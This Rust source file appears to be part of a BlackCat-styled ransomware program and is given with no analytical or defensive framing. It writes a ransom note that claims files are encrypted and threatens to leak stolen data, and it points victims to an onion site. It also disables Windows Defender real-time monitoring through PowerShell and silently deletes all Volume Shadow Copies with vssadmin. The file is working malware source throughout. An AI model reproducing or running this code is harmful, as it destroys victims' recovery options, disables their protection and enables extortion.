use std::process::Command;

pub struct WindowsPlatform;

impl WindowsPlatform {
    #[cfg(target_os = "windows")]
    pub fn create_ransom_note(save_dir: &str, all_dirs: &str) -> Result<(), String> {
        let ransom_content = format!(
r#"-->> Introduction
Important files on your system was ENCRYPTED and now they have have "sttp" extension.

In order to recover your files you need to follow instructions below.
Sensitive Data
Sensitive data on your system was DOWNLOADED and it will be PUBLISHED if you refuse to cooperate.
Data includes:
{}

CAUTION
DO NOT MODIFY FILES YOURSELF.
DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.
YOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS.
YOUR DATA IS STRONGLY ENCRYPTED, YOU CAN NOT DECRYPT IT WITHOUT CIPHER KEY.

Recovery procedure
Follow these simple steps to get in touch and recover your data:
1. Download and install Tor Browser from: https://torproject.org/
2. Navigate to: http://blackcat-site.onion/?(ACCESS_KEY)"#, 
        all_dirs); // Вставляем список всех папок

        let note_path = format!("{}\\README_BLACKCAT.txt", save_dir);
        std::fs::write(&note_path, ransom_content)
            .map_err(|e| format!("Failed to create ransom note: {}", e))?;
        Ok(())
    }

    #[cfg(target_os = "windows")]
    pub fn disable_windows_defender() -> Result<(), String> {
        let _ = Command::new("powershell")
            .args(&["-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"])
            .output();
        Ok(())
    }

    #[cfg(target_os = "windows")]
    pub fn delete_shadow_copies() -> Result<(), String> {
        let _ = Command::new("cmd").args(&["/c", "vssadmin delete shadows /all /quiet"]).output();
        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    pub fn create_ransom_note(_d: &str, _l: &str) -> Result<(), String> { Ok(()) }
    #[cfg(not(target_os = "windows"))]
    pub fn disable_windows_defender() -> Result<(), String> { Ok(()) }
    #[cfg(not(target_os = "windows"))]
    pub fn delete_shadow_copies() -> Result<(), String> { Ok(()) }
}